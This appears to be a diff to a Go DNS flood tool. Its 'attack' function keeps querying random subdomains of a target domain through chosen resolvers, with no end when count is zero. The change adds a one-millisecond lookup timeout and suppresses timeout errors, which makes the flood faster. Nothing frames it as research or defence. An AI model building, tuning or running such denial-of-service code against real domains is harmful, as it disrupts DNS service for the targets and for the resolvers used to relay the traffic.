@@ -38,17 +38,18 @@ func createResolver(nameserver string) *net.Resolver {
 func attack(wg *sync.WaitGroup, domain, dnsServer string, count, delay int) {
 	defer wg.Done()
 	resolver := createResolver(dnsServer)
-	currentContext := context.TODO()
 	if count == 0 {
 		count = -1
 	}
 
 	for i := 0; i != count; {
+		ctx, cancel := context.WithTimeout(context.TODO(), time.Millisecond)
 		currentSubdomain := randomString(subdomainLength) + "." + domain
-		_, err := resolver.LookupHost(currentContext, currentSubdomain)
-		if err != nil && !strings.Contains(err.Error(), "no such host") {
+		_, err := resolver.LookupHost(ctx, currentSubdomain)
+		if err != nil && !strings.Contains(err.Error(), "i/o timeout") {
 			fmt.Println("error resolving "+currentSubdomain, err)
 		}
+		cancel()
 		time.Sleep(time.Duration(int64(delay) * int64(time.Millisecond)))
 		if count > 0 {
 			i++
@@ -70,7 +71,7 @@ func main() {
 	var serversList []string
 
 	if *targetDomain == "" {
-		fmt.Println("No domain specified")
+		fmt.Println("No target domain specified")
 		os.Exit(1)
 	}
 
